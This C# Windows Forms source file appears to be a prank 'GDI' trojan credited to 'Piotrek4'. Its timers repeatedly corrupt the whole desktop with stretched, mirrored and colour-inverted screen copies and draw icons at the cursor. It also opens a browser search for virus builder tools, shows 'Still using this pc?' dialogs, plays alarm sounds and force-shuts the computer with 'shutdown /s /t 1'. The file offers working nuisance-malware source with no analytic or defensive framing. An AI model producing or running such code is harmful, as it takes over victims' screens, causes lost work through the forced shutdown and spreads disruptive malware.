using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace gdi_test
{
    public partial class gdi : Form
    {
        [DllImport("user32.dll")]
        static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        static extern IntPtr GetWindowDC(IntPtr hWnd);

        [DllImport("Shell32.dll", EntryPoint = "ExtractIconExW", CharSet = CharSet.Unicode, ExactSpelling = true,
        CallingConvention = CallingConvention.StdCall)]
        private static extern int ExtractIconEx(string sFile, int iIndex, out IntPtr piLargeVersion,
        out IntPtr piSmallVersion, int amountIcons);

        [DllImport("user32.dll")]
        static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);

        [DllImport("gdi32.dll")]
        static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest,
        int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc,
        TernaryRasterOperations dwRop);

        [DllImport("user32.dll")]
        public static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);

        [DllImport("User32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int uMsg, int wParam, string lParam);

        static void ExportToNotepad(string text)
        {
            ProcessStartInfo startInfo = new ProcessStartInfo("notepad");
            startInfo.UseShellExecute = false;

            Process notepad = Process.Start(startInfo);
            notepad.WaitForInputIdle();

            IntPtr child = FindWindowEx(notepad.MainWindowHandle, new IntPtr(0), null, null);
            SendMessage(child, 0x000c, 0, text);
            //SendKeys.Send("stop hacking loser");
            
        }

        public enum TernaryRasterOperations 
        {
            SRCCOPY = 0x00CC0020,
            SRCPAINT = 0x00EE0086, 
            SRCAND = 0x008800C6, 
            SRCINVERT = 0x00660046, 
            SRCERASE = 0x00440328, 
            NOTSRCCOPY = 0x00330008, 
            NOTSRCERASE = 0x001100A6, 
            MERGECOPY = 0x00C000CA, 
            MERGEPAINT = 0x00BB0226, 
            PATCOPY = 0x00F00021, 
            PATPAINT = 0x00FB0A09, 
            PATINVERT = 0x005A0049, 
            DSTINVERT = 0x00550009, 
            BLACKNESS = 0x00000042, 
            WHITENESS = 0x00FF0062,
            RAND = 0x008800C6,
        }

        public static Icon Extract(string file, int number, bool largeIcon) 
        {
            IntPtr large;
            IntPtr small;
            ExtractIconEx(file, number, out large, out small, 1);
            try 
            {
                return Icon.FromHandle(largeIcon ? large : small);
            }
            catch
            {
                return null;
            }
        }


        public gdi()
        {
            InitializeComponent();
            TransparencyKey = BackColor;
        }

        private void gdi_Load(object sender, EventArgs e)
        {
            //startpayload();
            //TEMPORARY CODE
            //pl1 p1 = new pl1();
            //p1.Show();
            //this.Hide();
            ExportToNotepad("greetings from Piotrek4! :)");
        }

        public void startpayload()
        {
            timer1.Start();
            timer2.Start();
            timer3.Start();
            timer4.Start();
            timer5.Start();
        }

        Random r;

        public void stillusingpc()
        {
            MessageBox.Show("Still using this pc?", ":D", MessageBoxButtons.YesNo, MessageBoxIcon.Question);

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            timer1.Stop();
            r = new Random();
            if (timer1.Interval > 101)
            {
                timer1.Interval = 800;
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                int x = Screen.PrimaryScreen.Bounds.Width * 2;
                int y = Screen.PrimaryScreen.Bounds.Height * 2;
                StretchBlt(hdc, r.Next(10), r.Next(10), x - r.Next(25), y - r.Next(25), hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                StretchBlt(hdc, x, 0, -x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                StretchBlt(hdc, 0, y, x, -y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
            }
            else if(timer1.Interval > 51)
            {
                timer1.Interval = 600;
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                int x = Screen.PrimaryScreen.Bounds.Width * 2;
                int y = Screen.PrimaryScreen.Bounds.Height * 2;
                StretchBlt(hdc, r.Next(10), r.Next(10), x - r.Next(25), y - r.Next(25), hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                StretchBlt(hdc, x, 0, -x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                StretchBlt(hdc, 0, y, x, -y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
            }
            else
            {
                timer1.Interval = 500;
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                int x = Screen.PrimaryScreen.Bounds.Width * 2;
                int y = Screen.PrimaryScreen.Bounds.Height * 2;
                StretchBlt(hdc, r.Next(10), r.Next(10), x - r.Next(25), y - r.Next(25), hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                StretchBlt(hdc, x, 0, -x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                StretchBlt(hdc, 0, y, x, -y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                
                
            }
            timer1.Start();
        }

        Icon icon = Extract("shell32.dll", 235, true);
        //Image image = Image.FromFile(@"C:\Users\Worm\desktop\different_types_of_formats\xp_100.jpg");

        private void timer2_Tick(object sender, EventArgs e)
        {
            timer2.Stop();
            this.Cursor = new Cursor(Cursor.Current.Handle);
            int posX = Cursor.Position.X;
            int posY = Cursor.Position.Y;

            IntPtr desktop = GetWindowDC(IntPtr.Zero);
            using (Graphics g = Graphics.FromHdc(desktop))
            {
                g.DrawIcon(icon, posX, posY);
            }
            timer2.Start();
        }

        private void timer3_Tick(object sender, EventArgs e)
        {
            timer3.Stop();
            r = new Random();
            IntPtr hwnd = GetDesktopWindow();
            IntPtr hdc = GetWindowDC(hwnd);
            int x = Screen.PrimaryScreen.Bounds.Width;
            int y = Screen.PrimaryScreen.Bounds.Height;
            StretchBlt(hdc, 0, 0, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.NOTSRCCOPY);
            timer3.Interval = r.Next(5000);
            timer3.Start();
        }

        private void timer4_Tick(object sender, EventArgs e)
        {
            timer4.Stop();
            r = new Random();
            IntPtr hwnd = GetDesktopWindow();
            IntPtr hdc = GetWindowDC(hwnd);
            int x = Screen.PrimaryScreen.Bounds.Width;
            int y = Screen.PrimaryScreen.Bounds.Height;
            StretchBlt(hdc, r.Next(x), r.Next(y), x = r.Next(500), y = r.Next(500), hdc, 0, 0, x, y, TernaryRasterOperations.NOTSRCCOPY);
            timer4.Interval = r.Next(1, 1000);
            //InvalidateRect(IntPtr.Zero, IntPtr.Zero, true); // for erase hdc(graphics payloads)
            timer4.Start();
        }

        public int looptime = 0;

        private void timer5_Tick(object sender, EventArgs e)
        {
            if(looptime == 0)
            {
                //nothing
            }
            else if(looptime == 1)
            {
                
                System.Diagnostics.Process.Start("https://www.bing.com/search?q=virus+builder+tool+download&qs=n&form=QBRE&sp=-1&pq=&sc=0-0&sk=&cvid=B880B689F34B42E18B6797CF45672B79");
                timer1.Interval = 2500;
                timer2.Interval = 150;
                timer3.Interval = 2500;
                timer4.Interval = 2500;
            }
            else if(looptime == 2)
            {
                stillusingpc();
                timer1.Interval = 1000;
                timer2.Interval = 150;
                timer3.Interval = 1000;
                timer4.Interval = 1000;
            }
            else if (looptime == 3)
            {
                timer8.Start();
                stillusingpc();
            }
            else if (looptime == 5)
            {
                timer1.Interval = 500;
                timer2.Interval = 10;
                timer3.Interval = 500;   
                timer4.Interval = 500;
            }
            else if (looptime == 6)
            {
                timer1.Interval = 250;
                timer2.Interval = 2;
                timer3.Interval = 250;
                timer4.Interval = 250;
                timer8.Interval = 150;
                timer9.Start(); 
            }
            else if (looptime == 8)
            {
                timer1.Interval = 200;
                timer2.Interval = 2;
                timer3.Interval = 200;
                timer4.Interval = 200;
                timer8.Interval = 120;
            }
            else if (looptime == 10)
            {
                timer1.Interval = 50;
                timer2.Interval = 1;
                timer3.Interval = 50;
                timer4.Interval = 50;
                timer8.Interval = 105;
            }

            looptime += 1;
        }

        private void timer6_Tick(object sender, EventArgs e)
        {
            startpayload();
        }

        public int enleft = 0;

        private void timer7_Tick(object sender, EventArgs e)
        {
            
            if(enleft > 0)
            {
                System.Diagnostics.Process.Start("shutdown", "/s /t 1");
            }

            enleft += 1;
        }

        private void timer8_Tick(object sender, EventArgs e)
        {
            Random rndm = new Random();
            int g = rndm.Next(0, 5);
            if(g == 0)
            {
                System.Media.SystemSounds.Exclamation.Play();
            }
            else if(g == 1)
            {
                System.Media.SystemSounds.Hand.Play();
            }
        }

        private void timer9_Tick(object sender, EventArgs e)
        {
            IntPtr hwnd = GetDesktopWindow();
            IntPtr hdc = GetWindowDC(hwnd);
            int x = Screen.PrimaryScreen.Bounds.Width * 2;
            int y = Screen.PrimaryScreen.Bounds.Height * 2;
            StretchBlt(hdc, r.Next(1, 10), r.Next(1, 10), x - r.Next(1, 25), y - r.Next(1, 25), hdc, 0, 0, x, y, TernaryRasterOperations.RAND);
            StretchBlt(hdc, x, 0, -x, y, hdc, 0, 0, x, y, TernaryRasterOperations.RAND);
            StretchBlt(hdc, 0, y, x, -y, hdc, 0, 0, x, y, TernaryRasterOperations.RAND);

        }
    }
}
